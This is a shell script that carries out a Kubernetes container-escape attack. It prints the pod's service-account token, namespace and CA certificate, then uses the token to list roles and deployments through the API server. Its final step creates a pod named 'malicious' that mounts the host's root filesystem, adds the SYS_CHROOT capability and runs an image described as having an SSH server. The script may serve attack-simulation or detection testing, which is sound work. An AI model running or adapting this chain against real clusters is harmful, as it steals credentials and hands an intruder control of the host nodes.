#!/bin/sh
set -e 

echo "[start] kubernetes resource manipulation started"

find /var/run -name "*kubernetes*" 2>/dev/null

ls -al /var/run/secrets/kubernetes.io/serviceaccount/

cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}

export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt

curl --max-time 5 --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -v https://$APISERVER//apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/roles

curl --max-time 5 --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -v https://$APISERVER/apis/apps/v1/namespaces/$NAMESPACE/deployments/

curl --max-time 5 --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X POST -H 'Content-Type: application/yaml' --data '
apiVersion: v1
kind: Pod
metadata:
  name: malicious
spec:
  containers:
  - name: malicious
    image: # malicious image with ssh server,
    imagePullPolicy: Always
    ports:
    - containerPort: 80
    securityContext:
      capabilities:
        add:
        - SYS_CHROOT
    volumeMounts:
    - name: host-path
      mountPath: /host
  volumes:
  - name: host-path
    hostPath:
      path: /
' https://$APISERVER/api/v1/namespaces/$NAMESPACE/pods/

echo "[done] kubernetes resource manipulation completed"